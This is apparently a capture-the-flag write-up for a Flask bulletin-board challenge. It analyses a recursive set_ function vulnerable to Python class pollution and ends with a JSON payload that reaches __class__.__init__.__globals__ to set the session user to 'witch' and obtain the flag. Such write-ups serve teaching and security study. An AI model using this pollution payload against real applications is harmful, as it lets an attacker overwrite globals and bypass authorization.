+ When the Flask’s session’s user is witch, it’ll render the flag’s value from the environment variable.
+ After analyzing the source code the vulnerability seems to be in the set_ function which can be leveraged to pollute the user attribute of the session class in the flask application.
+ When a user visits the main page, the session[“user”] is set as “hansel & gretel”.

By sending a post request to save_bulletins in the following format users can save bulletins.
```
{
    "new_content": [
        {
            "title": "Test title",
            "text": "Test text"
        }
    ]
}
```
+ The bulletins are getting saved in the bulletin_board object. The class Board will be instantiated as bulletin_board when the app is run. The bulletins are saved in this object. This is achieved by the set_ function. The set_ function will iterate through all the keys in the source JSON from the request, and sets the keys as new attributes to the object structure and sets their value to the corresponding values in the JSON.
+ In the above example a new attribute called new_content will be added to the bulletin_board, and can now be referred to as bulletin_board.new_content. The value of new_content will become [ { “title”: “Test title”, “text”: “Test text” } ]
+ The user can load the bulletins by sending a POST request to load_bulletins. The bulletin_board.new_content will be appended to the bullentin_board.current_content and bullentin_board.new_content will be set to None. The bullentin_board.current_content will be reversed and returned.
+ Next, the /flag route. Sending a GET request to /flag, the flag will be fetched from environment variables and returned in the response if the session[“user”] is witch.
+ One way is to modify the session cookie. But this does not work in this context because the session is signed with a random key app.config[“SECRET_KEY”] = str(os.urandom(32)).
```
def set_(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                set_(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            set_(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```
+ 
    ```
  class Board():
    def __init__(self): pass


    @property
    def pinned_content(self):
        return [{
            "title": "Our First Adventure!", 
            "text": "Today we went to the forest and you can't believe what we've got to! It's a house made out of gingerbread, cake and candy! How sweet it is!"
        }]
    
    current_content = []

    [...]

    def load(self):
        res = self.pinned_content
        if isinstance(self.current_content, list) and len(self.current_content) > 0 and all(["title" in x and "text" in x for x in self.current_content]):
            res.extend(self.current_content)
        if hasattr(self, "new_content") and self.new_content is not None:
            new_content = getattr(self, "new_content")
            self.current_content.extend(new_content)
            res.extend(new_content)
            self.new_content = None
        return res[::-1]   
bulletin_board = Board()
@app.route("/")
def index():
    session["user"] = "hansel & gretel"
    bulletins = requests.post("http://localhost:3000/load_bulletins").json()
    return render_template("index.html", bulletins=bulletins)

+ When we go to /, it’ll set our session’s user to hansel & gretel, send a POST request to /load_bulletins route, and render the bulletins JSON data:
+ The load() method from class Board will first append the “Our First Adventure!” post, then append other new_content.
+ When we send a POST request to /save_bulletins, it’ll check the request’s header Content-Type is application/json or not. If it’s correct, call save() method with our request’s data from class Board.

+ Final payload to /flag
```
{"new_content": [{"title": "Test title","text": "Test text"}],
    "__class__":{
            "__init__":{
              "__globals__":{
               "session":{
                "user":"witch"
                }
            }
        }
    }
}
```
